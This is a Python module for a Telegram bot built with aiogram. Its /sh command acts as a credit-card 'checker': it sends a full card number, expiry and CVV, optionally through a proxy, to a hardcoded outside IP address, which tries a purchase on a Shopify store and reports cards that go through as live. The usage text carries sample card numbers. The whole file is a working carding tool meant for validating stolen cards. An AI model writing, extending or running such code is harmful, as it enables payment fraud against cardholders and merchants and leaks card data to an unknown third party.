from aiogram import Router, types
from aiogram.filters import Command
import asyncio
import requests
import urllib.parse

router = Router()

# Default Shopify site – change this to whatever you want
DEFAULT_SITE = "https://us-auto-supplies.myshopify.com"

async def run_sync(func, *args, **kwargs):
    return await asyncio.to_thread(func, *args, **kwargs)

def check_shopify_sync(card_str, proxy=None, site=None):
    if site is None:
        site = DEFAULT_SITE
    
    # Parse card
    parts = card_str.split('|')
    if len(parts) != 4:
        return "❌ Invalid card format. Use: CC|MM|YY|CVV"
    cc, mm, yy, cvv = [p.strip() for p in parts]
    # Normalize year
    if len(yy) == 2:
        yy = f"20{yy}"
    # Rebuild card string for API (use original 2-digit year? API expects as given)
    card_api = f"{cc}|{mm}|{yy[-2:]}|{cvv}"
    
    # Build API URL
    base_api = "http://162.217.248.95:8000/"
    params = {
        "gate": "autoshopii",
        "key": "BlackxCard",
        "cc": card_api,
        "site": site
    }
    if proxy:
        params["proxy"] = proxy
    
    url = base_api + "?" + urllib.parse.urlencode(params)
    try:
        resp = requests.get(url, timeout=30)
        if resp.status_code != 200:
            return f"❌ API error (HTTP {resp.status_code})"
        data = resp.json()
        response_text = data.get("Response", "Unknown")
        if "Order completed" in response_text or "success" in response_text.lower():
            # Format success message – hide Site
            result = (
                f"✅ {response_text}\n"
                f"💳 {data.get('CC', card_api)}\n"
                f"💰 Price: {data.get('Price', 'Unknown')}\n"
                f"🏪 Gate: {data.get('Gate', 'Shopify Payments')}"
            )
            return result
        else:
            return f"❌ {response_text}"
    except Exception as e:
        return f"❌ Error: {str(e)[:100]}"

async def run_shopify(card_str, proxy=None, site=None):
    return await asyncio.to_thread(check_shopify_sync, card_str, proxy, site)

@router.message(Command("sh"))
async def cmd_shopify(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer(
            "❌ **Usage:** `/sh CC|MM|YY|CVV [proxy]`\n"
            "Example: `/sh 5449285929836687|11|26|169`\n"
            "With proxy: `/sh 5449285929836687|11|26|169 co-bog.pvdata.host:8080:user:pass`\n\n"
            f"Default site: {DEFAULT_SITE}"
        )
        return
    
    parts = args[1].split()
    card = parts[0]
    proxy = parts[1] if len(parts) > 1 else None
    
    progress = await message.answer("⏳ Checking Shopify...")
    result = await run_shopify(card, proxy)
    await progress.edit_text(result)
